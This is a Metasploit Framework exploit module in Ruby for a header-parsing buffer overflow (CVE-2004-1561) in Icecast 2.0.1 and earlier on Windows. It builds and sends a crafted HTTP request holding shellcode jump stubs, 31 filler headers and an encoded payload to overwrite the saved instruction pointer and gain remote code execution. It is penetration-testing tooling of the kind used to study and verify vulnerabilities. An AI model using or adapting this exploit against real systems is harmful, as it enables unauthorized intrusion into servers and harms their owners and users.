##
# $Id: icecast_header.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Icecast (<= 2.0.1) Header Overwrite (win32)',
			'Description'    => %q{
					This module exploits a buffer overflow in the header parsing
				of icecast, discovered by Luigi Auriemma.  Sending 32 HTTP
				headers will cause a write one past the end of a pointer
				array.  On win32 this happens to overwrite the saved
				instruction pointer, and on linux (depending on compiler,
				etc) this seems to generally overwrite nothing crucial (read
				not exploitable).

				!! This exploit uses ExitThread(), this will leave icecast
				thinking the thread is still in use, and the thread counter
				won't be decremented.  This means for each time your payload
				exits, the counter will be left incremented, and eventually
				the threadpool limit will be maxed.  So you can multihit,
				but only till you fill the threadpool.

			},
			'Author'         => [ 'spoonm', 'Luigi Auriemma <aluigi@autistici.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2004-1561'],
					[ 'OSVDB', '10406'],
					[ 'BID', '11271'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x0d\x0a\x00",
					'DisableNops' => true,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Sep 28 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(8000)
			], self.class)
	end

	# Interesting that ebp is pushed after the local variables, and the line array
	# is right before the saved eip, so overrunning it just by 1 element overwrites
	# eip, making an interesting exploit....
	# .text:00414C00                 sub     esp, 94h
	# .text:00414C06                 push    ebx
	# .text:00414C07                 push    ebp
	# .text:00414C08                 push    esi

	def exploit
		connect

		# bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
		# jmp 12
		evul = "\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n"
		evul << "Accept: text/html\r\n" * 31;

		# jmp [esp+4]
		evul << "\xff\x64\x24\x04\r\n"
		evul << "\r\n"

		sock.put(evul)

		handler
		disconnect
	end

end
